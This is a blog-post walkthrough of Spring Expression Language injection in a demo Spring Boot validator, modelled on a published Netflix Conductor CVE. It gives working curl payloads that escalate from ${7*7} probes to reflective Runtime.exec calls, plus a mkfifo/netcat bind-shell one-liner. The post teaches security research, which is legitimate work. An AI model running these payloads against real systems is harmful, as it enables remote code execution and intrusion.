---
layout: single
title:  '[WebApps] Leveraging the Spring Expression Language (SpEL) injection vulnearbility to get RCE'
description: 'This blog post explains the Spring Expression Language injection (SpEL) issue and shows how to be exploited in order to get access to the target system that hosts the application'
date: 2021-11-18
classes: wide
comments: false
header:
  teaser: /assets/images/avatar.jpg
tags:
  - eclipse IDE
  - maven
  - Spring Boot
  - Expression Language Injection
  - Java 
  - Web frameworks
  - Source Code Review 
--- 

<p align="justify">
This blog post shares knowlege about how to find critical vulnerabilities in the source code that can be leveraged in order to compromise a target system. Moreover, the purpose of this article is to show how the Expression Language intepreter, if used mistakenly, it can expose the application to further attacks such as Cross-Site Scripting (XSS) or even Remote Code Execution (RCE). In short, injecting arbitrary code by using the Web Frameworks' Expression Language mechanism, is considered a Server Side Template Injection (SSTI) vulnerability. This article will explain a remote code execution path leveraging the Spring Expression Language ( SpEL for short ) mechanism. According to this <a href="https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html">article</a>, the Spring Expression Language is a powerful expression language that supports querying and manipulating an object graph at runtime. It offers additional features than the common EL, most notably method invocation and basic string templating functionality. Furthermore, according to this <a href="https://portswigger.net/research/server-side-template-injection">site</a>, the Template Injection issue can arise both through developer error, and through the intentional exposure of templates in an attempt to offer rich functionality, as commonly done by many applications out there. Furthermore, this article will demonstrate an implementation that uses a similar dependency with the one used in Netflix application, presenting an Expression Language Injection when building custom constraint violation error messages, as also seen in the following site <a href="https://securitylab.github.com/advisories/GHSL-2020-027-netflix-conductor"> Server-Side Template Injection in Netflix Conductor </a>, with the related <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-9296">CVE-2020-9296</a>. 
</p>

<p align="justify">
 This article is not intented to show how to setup a Spring Boot application. For the purpose of this article, a demo application downloaded from <a href="https://mkyong.com/spring-boot/spring-rest-validation-example/">mkyong</a> site has been used. After importing the application in eclipse IDE, some minor changes in the code has been done, with the most of them at the <i><b>AuthorValidator</b></i> class, which considered our point of interest.    
</p>

<p align="justify">
Before moving further, we need to understand the logic behind the implementation. Ofcourse this is a demo application and its logic is simple. By reviewing the code we understand that in runtime, there are three books saved into the database, with book title, Author and price. We can see this at the <i><b>StartBookApplication</b></i> class at function <i><b>initDatabase</b></i>. 
</p>

```java
[....]
@Profile("demo")
    @Bean
    CommandLineRunner initDatabase(BookRepository repository) {
        return args -> {
            repository.save(new Book("A Guide to the Bodhisattva Way of Life", "Santideva", new BigDecimal("15.41")));
            repository.save(new Book("The Life-Changing Magic of Tidying Up", "Marie Kondo", new BigDecimal("9.69")));
            repository.save(new Book("Refactoring: Improving the Design of Existing Code", "Martin Fowler", new BigDecimal("47.99")));
        };
    }
[....]
```

<p align="justify">
Furthermore, we see the <i><b>BookController</b></i> class where the actions, search, update, save and delete are implemented with specific REST endpoints. 
</p>

```java
[......]
@RestController
@Validated
public class BookController {

    @Autowired
    private BookRepository repository;

    // Find
    @GetMapping("/books")
    List<Book> findAll() {
        return repository.findAll();
    }

    // Save
    @PostMapping("/books")
    @ResponseStatus(HttpStatus.CREATED)
    Book newBook(@Valid @RequestBody Book newBook) {
        return repository.save(newBook);
    }

    // Find
    @GetMapping("/books/{id}")
    Book findOne(@PathVariable @Min(1) Long id) {
        return repository.findById(id)
                .orElseThrow(() -> new BookNotFoundException(id));
    }
[.....]
```

<p align="justify">
Looking closely into the code, we can see the function used to perform some kind of validation when adding a new book.
</p>

```java

[.....]
// Save
    @PostMapping("/books")
    @ResponseStatus(HttpStatus.CREATED)
    Book newBook(@Valid @RequestBody Book newBook) {
        return repository.save(newBook);
    }
[.....]
```

<p align="justify">
At this point, we won't go into further details of code base implementation as this is not intented to be discussed in this article, but we will go streight forward into the classes and the validation logic that interest us the most. In a brief explanation, as we realized by doing a thorough review to the code base, we see that the application implements a validation mathod that checks if the number of the Authors is exceeded when a new book is about to be saved into the database, and if it does, then the application returns a custom error message that informs the user that the book with the specific Author name cannot be added. Moreover, as told earlier, there was some minor changes into the code base of the demo application, and these changes have been done because the demo application was using a default constraint violation implementation. The default behaviour happens when a validation error occurs, where the validation runtime will use the default value, that specified for the message attribute of the <i><b>@Vaild</b></i> annotation to look up the error message in this file.
</p>

<p align="justify">
For more details on how to implement custom constraints and to understand the inner workings of contraint annotations and validation, refer to this <a href="https://docs.jboss.org/hibernate/validator/4.1/reference/en-US/html/validator-customconstraints.html#validator-customconstraints">link</a>. So, to be more specific, the code that have been changed in order to implement a custom constraint violation can be seen as follows    
</p>

```java 

import javax.validation.ConstraintValidator;
import javax.validation.ConstraintValidatorContext;
import java.util.Arrays;
import java.util.List;

public class AuthorValidator implements ConstraintValidator<Author, String> {

    List<String> authors = Arrays.asList("Santideva", "Marie Kondo", "Martin Fowler");

    @Override
    public void initialize(Author constraintAnnotation) {
    }    

    @Override
    public boolean isValid(String value, ConstraintValidatorContext context) {
      
        boolean valid = authors.contains(value);
        
        if ( value != "Santideva" && value != "Marie Kondo" && value != "Martin Fowler" ) 
        {
                context.disableDefaultConstraintViolation();
                valid = false;
                String message = String.format("Author %s is not allowed to be added. Only three authors are allowed", value );
                context.buildConstraintViolationWithTemplate(message).addConstraintViolation();
        }
       
        return valid;
        
    }
}

``` 

<p align="justify">
Can you spot the issue at the code above ? Well, the problem here arises when the user input can be passed into the custom message. Therefore if an attacker is able to inject arbitrary data in the error message template being passed to <code  style="background-color: lightgrey; color:black;">ConstraintValidatorContext.buildConstraintViolationWithTemplate()</code> argument, then he/she will be able to run arbitrary Java code. Ofcourse, this is a very simple application, but the meaning of the issue is the same as in the large code bases of real applications. In fact, at the most of the times in real applications, the way the user data are passed into the custom mesage could be slightly different, for example by using java bean properties, rather than using Srting values streight into the message. For this demonstration we can use either the curl command or the postman tool in order to interact with the application. 
</p>

<p align="justify">
Now lets try to add a new book to the application's database. The following command will be used in order to insert a new book into the database. As seen below, the book author named San could not be inserted into the database with a custom message returned to the user. 
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
root@kali:/home/kali# curl -X POST  http://localhost:8080/books -H "Content-type:application/json" -d "{\"name\":\"Spring REST tutorials\", \"author\":\"San\",\"price\":\"9.99\"}"

{
    "timestamp": "2021-11-17T12:12:04.069+0000",
    "status": 400,
    "errors": ["Author San is not allowed to be added. Only three authors are allowed"]
}
</pre>

<p align="justify">
Now lets try something else. Depending on the attributes into which the vulnerability exists, in order to find this type of vulnerability in a blackbox testing scenario we should send a valid EL such as: <code style="background-color: lightgrey; color:black;">${"aaaa"}</code> (the literal string "aaaa") and then searching the response text for such data without the EL syntax around it; or by sending <code  style="background-color: lightgrey; color:black;">${7*7}</code> and then searching the response text for the value <i><b>49</b></i> as seen below
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
root@kali:/home/kali# curl -X POST http://localhost:8080/books -H "Content-type:application/json" -d "{\"name\":\"Spring REST tutorials\", \"author\":\"\${7*7}\",\"price\":\"9.99\"}"

{
    "timestamp": "2021-11-17T12:28:24.005+0000",
    "status": 400,
    "errors": ["Author <span style="color:#cd0000;"><b>49</b></span> is not allowed to be added. Only three authors are allowed"]
}
</pre>

<p align="justify">
Well, what a surprise, we can send data to the vulnerable application from an entry point that we control. This means we can control the Expression Language interpreter and at this point we can try to get remote code execution. 
</p>

<p align="justify">
In order to exploit the vulnerability we will use the following payload 
</p>

```bash
mkfifo /tmp/pipebsh && /bin/bash /tmp/pipebsh | nc -l 443 > /tmp/pipebsh
```

<p align="justify">
The command above will open a named pipe to the target server listening on port 443. Moreover, if we connect to that port we will be able to execute commands. 
</p>


<p align="justify">
At this point all we have to do is to inject code and construct our payload, that will furhter lead us to inject commands to the target server. 
</p>

<p align="justify">
In order to be sure that we can inject code, we will use the following payload that performs a replacement at the letter 'k' with the letter 'x'
</p>

```bash

"${'zkz'.toString().replace('k', 'x')}"

```

Now lets inject this payload to the application


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
root@kali:/home/kali# curl -X POST  http://192.168.14.1:8080/books -H "Content-type:application/json" -d "{\"name\":\"Spring REST tutorials\", \"author\":\"\${'zkz'.toString().replace('k', 'x')}\",\"price\":\"9.99\"}"

{
    "timestamp": "2021-11-18T07:44:32.532+0000",
    "status": 400,
    "errors": ["Author zxz is not allowed to be added. Only three authors are allowed"]
}

</pre>


<p align="justify">
As we see above, we have successfully replaced the letter 'k' with the letter 'x'. Also, in a blackbox testing scenario we should verify that the method <code style="background-color: lightgrey; color:black;">getRuntime()</code> exists because we need to be sure that we can execute commands to the server using the invoked method <code style="background-color: lightgrey; color:black;">exec</code>. In order to verify this we should run the following command
</p>    

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
root@kali:/home/kali# curl -X POST  http://192.168.14.1:8080/books -H "Content-type:application/json" -d "{\"name\":\"Spring REST tutorials\", \"author\":\"\${''.getClass().forName('java.lang.Runtime').getMethods()[6].toString()}\",\"price\":\"9.99\"}"

{
    "timestamp": "2021-11-18T08:19:44.689+0000",
    "status": 400,
    "errors": ["Author <span style="color:#cd0000;"><b>public static java.lang.Runtime java.lang.Runtime.getRuntime()</b></span> is not allowed to be added. Only three authors are allowed"]
}

</pre>

<p align="justify">
At this point we are certain that we can execute commands to the server, so we are moving forward using the following code to deliver and execute our named pipe. 
</p>

```bash

${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('nc -l 8445')}

```

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
root@kali:/home/kali# curl -X POST  http://192.168.14.1:8080/books -H "Content-type:application/json" -d "{\"name\":\"Spring REST tutorials\", \"author\":\"\${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('nc -l 8445')}\",\"price\":\"9.99\"}"

{
    "timestamp": "2021-11-18T16:52:22.366+0000",
    "status": 400,
    "errors": ["Author Process[pid=68571, exitValue=\"not exited\"] is not allowed to be added. Only three authors are allowed"]
}

</pre>


<p align="justify">
When the above command executes succesfully, the injected command will be executed and then we will have a connection to the attacking machine. The following screenshot shows the successfull connection with the attacking machine
</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="https://xen0vas.github.io/assets/images/2021/09/nc.png" alt="netcat connection"/>


